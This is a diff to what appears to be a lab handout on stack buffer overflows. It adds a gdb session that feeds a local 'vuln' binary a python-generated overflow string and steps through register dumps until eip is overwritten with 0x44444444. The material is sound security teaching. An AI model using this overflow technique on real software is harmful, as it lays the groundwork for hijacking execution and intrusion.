@@ -268,6 +268,83 @@ eip            0x44444444          0x44444444
 0xffffcfec:     0x44444444      0x00000000
 ```
 
+You will likely need to step through your code until you exit main 
+(and then see the overwritten eip register this is the point of the crash)
+
+```bash
+(gdb) run $(python3 -c "print('\x41'*500+'\x42'*4+'\x43'*4+'\x44'*4)") 
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/khaefner/Development/buffer_overflow/vuln $(python3 -c "print('\x41'*500+'\x42'*4+'\x43'*4+'\x44'*4)")
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Breakpoint 1, 0x565561c3 in main (argc=0, argv=0xffffd134) at vuln.c:8
+8	}
+(gdb) info registers
+eax            0x0                 0
+ecx            0xffffd4e0          -11040
+edx            0xffffd07b          -12165
+ebx            0x42424242          1111638594
+esp            0xffffce80          0xffffce80
+ebp            0xffffd078          0xffffd078
+esi            0x56558eec          1448447724
+edi            0xf7ffcb80          -134231168
+eip            0x565561c3          0x565561c3 <main+54>
+eflags         0x292               [ AF SF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+(gdb) x/14x $sp+460
+0xffffd04c:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd05c:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd06c:	0x41414141	0x41414141	0x42424242	0x43434343
+0xffffd07c:	0x44444444	0x00000000
+(gdb) si
+0x565561c4	8	}
+(gdb) info registers
+eax            0x0                 0
+ecx            0xffffd4e0          -11040
+edx            0xffffd07b          -12165
+ebx            0x42424242          1111638594
+esp            0xffffd07c          0xffffd07c
+ebp            0x43434343          0x43434343
+esi            0x56558eec          1448447724
+edi            0xf7ffcb80          -134231168
+eip            0x565561c4          0x565561c4 <main+55>
+eflags         0x292               [ AF SF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+(gdb) si
+0x44444444 in ?? ()
+(gdb) info registers
+eax            0x0                 0
+ecx            0xffffd4e0          -11040
+edx            0xffffd07b          -12165
+ebx            0x42424242          1111638594
+esp            0xffffd080          0xffffd080
+ebp            0x43434343          0x43434343
+esi            0x56558eec          1448447724
+edi            0xf7ffcb80          -134231168
+eip            0x44444444          0x44444444
+eflags         0x292               [ AF SF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+```
+
+
+
 ---
 `Action:`  Take a screen shot of your memory layout
 ---
